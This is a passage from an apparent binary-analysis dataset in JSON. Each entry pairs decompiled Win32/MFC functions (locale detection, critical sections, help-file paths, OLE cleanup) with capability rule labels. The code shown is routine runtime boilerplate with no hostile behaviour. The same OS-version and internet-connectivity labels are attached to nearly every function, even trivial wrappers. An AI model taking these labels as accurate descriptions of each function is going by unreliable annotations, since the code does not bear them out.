        "decompiled_code": "\nvoid __cdecl fcn.00436e48(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x450484;\n    uVar3 = *0x450480;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.00432414(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 351
    },
    "0043780f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043780f(code **param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    param_1[5] = 0xc0000001;\n    fcn.0040f08a();\n    iVar2 = fcn.00438818();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.00438818();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.00436fac(1);\n        iVar2 = fcn.00438818();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x1c) == 0)) {\n            iVar2 = fcn.00438818();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.0043b077(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0042ecf6();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00436ff9. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x1c) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "00437abd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00437abd(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_28h;\n    int32_t lpType;\n    uint lpcbData;\n    uint32_t hKey;\n    uint32_t lParam;\n    uint lpData;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    var_4h = *0x44d270;\n    lParam = 0;\n    iVar5 = 0;\n    lpcbData = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetUserDefaultUILanguage\");\n    if (pcVar2 == NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar6 < 0) {\n            hKey = 0;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                              (0x80000001, \"Control Panel\\\\Desktop\\\\ResourceLocale\", 0, 0x20019, &hKey);\n            if (iVar6 == 0) {\n                lpcbData = 0x10;\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0, 0, &lpType, &lpData, &lpcbData);\n                if (((iVar6 == 0) && (lpType == 1)) &&\n                   (iVar6 = fcn.004198af(&lpData, 0x43f36c, &var_28h), \n                   pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar6 == 1)) {\n                    lParam = var_28h;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(var_28h & 0xffff);\n                    var_38h = (*pcVar1)(var_28h & 0x3ff);\n                    iVar5 = 2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n        else {\n            iVar6 = (*pcVar1)(\"ntdll.dll\");\n            if (iVar6 != 0) {\n                lParam = 0;\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)(iVar6, 0x10, 1, 0x437aa7, &lParam);\n                pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n                if (lParam != 0) {\n                    uVar4 = lParam & 0x3ff;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n                    var_38h = (*pcVar1)(uVar4);\n                    iVar5 = 2;\n                }\n            }\n        }\n    }\n    else {\n        lParam = (*pcVar2)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        hKey = lParam & 0x3ff;\n        var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n        var_38h = (*pcVar1)(hKey);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetSystemDefaultUILanguage\");\n        lParam = (*pcVar2)();\n        uVar4 = lParam & 0x3ff;\n        var_34h = (*pcVar1)(lParam & 0xffff);\n        var_30h = (*pcVar1)(uVar4);\n        iVar5 = 4;\n    }\n    (&var_3ch)[iVar5] = 0x800;\n    iVar6 = 0;\n    if (iVar5 != -1) {\n        do {\n            iVar3 = fcn.00437a28(arg_8h, (&var_3ch)[iVar6]);\n            if (iVar3 != 0) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar5 + 1);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 995
    },
    "00437f4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437f4f(int32_t param_1)\n\n{\n    if (*(param_1 + 0x84) != NULL) {\n        (**(**(param_1 + 0x84) + 0x14))();\n    }\n    if (*(param_1 + 0x90) != 0) {\n        fcn.00433eea(\"Settings\", \"PreviewPages\", *(param_1 + 0x90));\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00438641": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438641(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x138))();\n    }\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.0042a203();\n            fcn.0042f834(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 389
    },
    "00438999": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00438999(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x004389a0. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00438b71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438b71(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00438db8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438db8(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.00438ba9(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 361
    },
    "00438f3e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00438f3e(int32_t param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint unaff_retaddr;\n    \n    puVar3 = *0x4504c8;\n    if (*0x4504c8 != NULL) {\n        puVar1 = *0x4504c8 + 7;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n        if (param_1 == 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar3);\n            if (iVar4 != 0) {\n                fcn.00438db8(iVar4, unaff_retaddr);\n            }\n        }\n        else {\n            iVar4 = puVar3[5];\n            while (iVar4 != 0) {\n                iVar2 = *(iVar4 + 4);\n                fcn.00438db8(iVar4, param_2);\n                iVar4 = iVar2;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        return;\n    }\n    return;\n}\n",
        "token_count": 266
    },
    "00438ea6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00438ea6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    if (*extraout_ECX == 0) {\n        if (*0x4504c8 == 0) {\n            *(unaff_EBP + -0x10) = 0x4504cc;\n            *(unaff_EBP + -4) = 0;\n            *0x4504c8 = fcn.00438bf0();\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        iVar1 = fcn.004389a9();\n        *extraout_ECX = iVar1;\n    }\n    iVar1 = fcn.00438ab5(*extraout_ECX);\n    if (iVar1 == 0) {\n        iVar1 = (**(unaff_EBP + 8))();\n        fcn.00438c95(*extraout_ECX, iVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 328
    },
    "00438fcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00438fcf(void)\n\n{\n    if (*0x4506f8 == 0) {\n        *0x4506f8 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x450544);\n    }\n    return *0x4506f8;\n}\n",
        "token_count": 71
    },
    "00439038": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00439038(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x4506f8 == 0) {\n        fcn.00438fcf();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x450500;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x450544);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x450560);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x450544);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x450560);\n    return;\n}\n",
        "token_count": 219
    },
    "0043929b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0043929b(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameA)(param_1);\n    if (param_1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(uVar1);\n        iVar2 = iVar2 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_1, uVar1, param_2);\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 149
    },
    "004392ca": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004392ca(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar auStack784 [256];\n    uchar auStack528 [260];\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    iVar1 = fcn.00438818();\n    *(iVar1 + 8) = *(param_1 + 0x40);\n    *(iVar1 + 0xc) = *(param_1 + 0x40);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(*(param_1 + 0x40), auStack528, 0x104);\n    if ((iVar2 == 0) || (iVar2 == 0x104)) {\n        fcn.00432146();\n    }\n    puVar3 = (*_sym.imp.SHLWAPI.dll_PathFindExtensionA)(auStack528);\n    if (puVar3 == NULL) {\n        fcn.00432146();\n    }\n    *puVar3 = 0;\n    iVar2 = fcn.0043929b(auStack528, auStack268, 0x104);\n    if (iVar2 != 0) {\n        fcn.00432146();\n    }\n    if (*(param_1 + 0x5c) == 0) {\n        uVar4 = fcn.00419aaa(auStack268);\n        *(param_1 + 0x5c) = uVar4;\n    }\n    if (*(param_1 + 0x4c) == 0) {\n        iVar2 = fcn.0043080f(0xe000, auStack784, 0x100);\n        if (iVar2 == 0) {\n            puVar5 = *(param_1 + 0x5c);\n        }\n        else {\n            puVar5 = auStack784;\n        }\n        uVar4 = fcn.00419aaa(puVar5);\n        *(param_1 + 0x4c) = uVar4;\n    }\n    *(iVar1 + 0x10) = *(param_1 + 0x4c);\n    if (*(param_1 + 0x60) == 0) {\n        if (*(param_1 + 0x68) == 1) {\n            pcVar6 = \".CHM\";\n        }\n        else {\n            pcVar6 = \".HLP\";\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(puVar3, pcVar6);\n        uVar4 = fcn.00419aaa(auStack528);\n        *(param_1 + 0x60) = uVar4;\n        *puVar3 = 0;\n    }\n    if (*(param_1 + 100) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(auStack268, \".INI\");\n        uVar4 = fcn.00419aaa(auStack268);\n        *(param_1 + 100) = uVar4;\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 713
    },
    "00439418": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00439418(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint unaff_ESI;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_SetErrorMode;\n    uVar2 = (*_sym.imp.KERNEL32.dll_SetErrorMode)(0);\n    (*pcVar1)(uVar2 | 0x8001);\n    iVar3 = fcn.00438818();\n    *(iVar3 + 8) = unaff_ESI;\n    *(iVar3 + 0xc) = unaff_ESI;\n    iVar3 = fcn.00438818();\n    iVar3 = *(iVar3 + 4);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x44) = param_1;\n        *(iVar3 + 0x48) = param_2;\n        *(iVar3 + 0x40) = unaff_ESI;\n        fcn.004392ca();\n    }\n    iVar3 = fcn.00438818();\n    if (*(iVar3 + 0x14) == '\\0') {\n        fcn.0042ff16();\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"user32.dll\");\n    if (iVar3 != 0) {\n        *0x45011c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"NotifyWinEvent\");\n    }\n    return 1;\n}\n",
        "token_count": 332
    },
    "00439527": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00439527(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    fcn.00439eb7();\n    fcn.0043b103();\n    fcn.00417d60();\n    if (param_1 == 0) {\n        iVar1 = fcn.0042fa75();\n        if (iVar1 != 0) {\n            if (*(iVar1 + 0x3c) != NULL) {\n                (**(**(iVar1 + 0x3c) + 4))(1);\n            }\n            *(iVar1 + 0x3c) = 0;\n        }\n        iVar1 = fcn.00438808();\n        if (*(iVar1 + 0x100) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar1 + 0x100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00439816": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00439816(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (param_1[1] == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(param_1 + 1);\n    if (iVar1 == 0) {\n        (**(*param_1 + 0x10))();\n    }\n    return iVar1;\n}\n",
        "token_count": 105
    },
    "00439854": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00439854(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    \n    piVar1 = (**(*param_1 + 0x44))(param_2);\n    if (piVar1 == NULL) {\n        ppiVar2 = (**(*param_1 + 0x38))();\n        if ((((*0x443cbc == *param_2) && (param_2[1] == *0x443cc0)) && (param_2[2] == *0x443cc4)) &&\n           (param_2[3] == *0x443cc8)) {\n            do {\n                for (piVar1 = ppiVar2[1]; *piVar1 != 0; piVar1 = piVar1 + 2) {\n                    if (*(piVar1[1] + param_1) != 0) {\n                        return piVar1[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        else {\n            do {\n                for (ppiVar3 = ppiVar2[1]; piVar1 = *ppiVar3,  piVar1 != NULL; ppiVar3 = ppiVar3 + 2) {\n                    if (((*piVar1 == *param_2) && (piVar1[1] == param_2[1])) &&\n                       ((piVar1[2] == param_2[2] && ((piVar1[3] == param_2[3] && (*(ppiVar3[1] + param_1) != 0)))))) {\n                        return ppiVar3[1] + param_1;\n                    }\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 452
    },
    "00439902": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00439902(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    piVar2 = (**(*in_ECX + 0x38))();\n    do {\n        for (piVar3 = piVar2[1]; *piVar3 != 0; piVar3 = piVar3 + 2) {\n        }\n        for (piVar3 = piVar3 + 1; *piVar3 != -1; piVar3 = piVar3 + 2) {\n            puVar1 = *(in_ECX + *piVar3);\n            if (puVar1 != NULL) {\n                var_4h = 0;\n                iVar4 = (***puVar1)(puVar1, arg_8h, &var_4h);\n                if ((iVar4 == 0) && (var_4h != 0)) {\n                    return var_4h;\n                }\n            }\n        }\n        piVar2 = *piVar2;\n        if (piVar2 == NULL) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 292
    },
    "00439962": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439962(int32_t param_1)\n\n{\n    if (*(param_1 + 8) != 0) {\n        (**(**(param_1 + 8) + 4))(*(param_1 + 8));\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(param_1 + 4);\n    return;\n}\n",
        "token_count": 85
    },
    "00439a26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00439a26(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x70) = param_2;\n    if (param_2 != 1) {\n        param_2 = ((param_2 != 2) - 1 & 3) - 1;\n    }\n    return param_2;\n}\n",
        "token_count": 89
    },
    "00439abf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00439abf(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    \n    iVar2 = *(param_1 + 100);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0x1c);\n    }\n    hWnd = param_1;\n    uVar1 = fcn.00433a06(iVar2, &hWnd);\n    *(param_1 + 0x7c) = uVar1;\n    fcn.0042df81(param_1);\n    iVar2 = sub.oledlg.dll_OleUIBusyA(param_1 + 0x74);\n    fcn.0042cba9();\n    fcn.0042cb7b();\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    uVar1 = 2;\n    if (iVar2 != 2) {\n        if (iVar2 == 0x75) {\n            *(param_1 + 0xa0) = 1;\n        }\n        else {\n            if (iVar2 != 0x76) {\n                if (iVar2 == 0x77) {\n                    *(param_1 + 0xa0) = 3;\n                    return 1;\n                }\n                uVar1 = fcn.00439a26(iVar2);\n            }\n            *(param_1 + 0xa0) = uVar1;\n        }\n        return 1;\n    }\n    return 2;\n}\n",
        "token_count": 349
    },
    "00439b6b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00439b6b(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CEnumArray.0;\n    pcVar1 = extraout_ECX[8];\n    *(unaff_EBP + -4) = 0;\n    if (pcVar1 != NULL) {\n        fcn.00439816();\n    }\n    if (extraout_ECX[0xc] != NULL) {\n        fcn.0042f834(extraout_ECX[9]);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042f31c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 244
    },
    "0043a236": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
